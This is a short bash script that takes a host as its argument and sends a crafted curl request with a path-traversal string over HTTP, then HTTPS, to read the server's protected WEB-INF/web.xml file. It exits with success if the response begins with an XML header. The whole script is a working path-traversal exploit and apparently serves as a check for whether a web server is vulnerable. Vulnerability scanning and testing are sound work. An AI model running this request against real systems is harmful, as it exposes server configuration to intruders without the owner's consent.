exitValue=1

VAR="$(curl --path-as-is "http://$1/./widget./../WEB-INF/web.xml;/../../s")"

if [[ "$VAR" == "<?xml version=\"1.0\"?>"* ]]; then
    exitValue=0
else
	VAR="$(curl --path-as-is "https://$1/./widget./../WEB-INF/web.xml;/../../s")"

	if [[ "$VAR" == "<?xml version=\"1.0\"?>"* ]]; then
	    exitValue=0
	fi
fi

exit $exitValue